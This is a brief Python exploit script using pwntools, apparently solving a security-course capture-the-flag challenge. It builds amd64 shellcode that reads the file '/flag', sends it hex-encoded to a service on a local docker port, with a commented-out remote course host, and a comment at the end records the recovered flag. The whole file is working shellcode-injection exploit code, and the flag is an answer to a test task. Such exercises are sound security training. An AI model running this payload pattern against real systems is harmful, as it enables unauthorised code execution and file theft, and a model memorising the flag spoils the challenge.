from pwn import *
import string
from sys import argv
import os
import time


context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'


# start remote
# p = remote('tasks.ws24.softsec.rub.de', 32856)

# start locally with docker
p = remote('127.0.0.1', 1024)


# payload reading the flag
payload = asm(shellcraft.amd64.linux.cat("/flag", fd=1))+b"\x00"

p.sendline(payload.hex().encode())

# see outputted flag
p.interactive()

#softsec{rd7YtDEKWn-jljQ81Q52u5-NPKGD1aHFWWEzPpdAUAzVdz6C05kkXMIxPL8D-PSy}